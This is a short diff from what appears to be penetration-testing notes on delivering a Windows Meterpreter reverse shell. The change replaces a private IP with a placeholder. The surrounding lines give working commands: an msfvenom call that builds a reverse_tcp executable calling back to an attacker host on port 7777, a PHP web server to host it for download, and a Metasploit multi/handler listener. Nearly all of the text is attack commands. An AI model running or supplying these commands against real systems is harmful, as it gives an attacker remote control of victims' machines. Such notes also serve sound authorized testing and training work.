@@ -22,7 +22,7 @@ Generate Payload -> powershell to download -> execute
 # Generate payload
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=7777 -f exe > ./reverse3.exe
 # Start Webserver to download
-php -S 10.5.21.24:80
+php -S <locahost-ip-address>:80
 # Start listener
 use exploit/multi/handler 
 set PAYLOAD windows/meterpreter/reverse_tcp 
